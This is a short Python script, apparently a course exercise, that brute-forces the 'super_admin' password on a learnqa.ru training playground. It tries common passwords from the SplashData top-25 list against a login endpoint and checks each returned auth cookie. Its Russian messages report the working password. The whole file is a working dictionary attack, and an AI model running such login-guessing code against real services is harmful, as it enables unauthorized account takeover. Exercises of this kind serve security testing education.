import requests

list_of_password = []

with open("my_list.txt", "r") as ins:
    for line in ins:
        line1 = line.rstrip('\n')
        if line1 not in list_of_password:
            list_of_password.append(line1)

for p in list_of_password:
    payload = {'login':'super_admin','password':p}
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_auth_cookie", data=payload)
    if response1.cookies.get("auth_cookie") is not None:
        cookies = {}
        cookie_value = response1.cookies.get("auth_cookie")
        cookies.update({'auth_cookie': cookie_value})
        response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
        if response2.text != "You are NOT authorized":
            print(f"Сообщение {response2.text}, пароль {p}")
            break
else:
    print("Подходящего пароля в списке  списка Top 25 most common passwords by year according to SplashData нет")


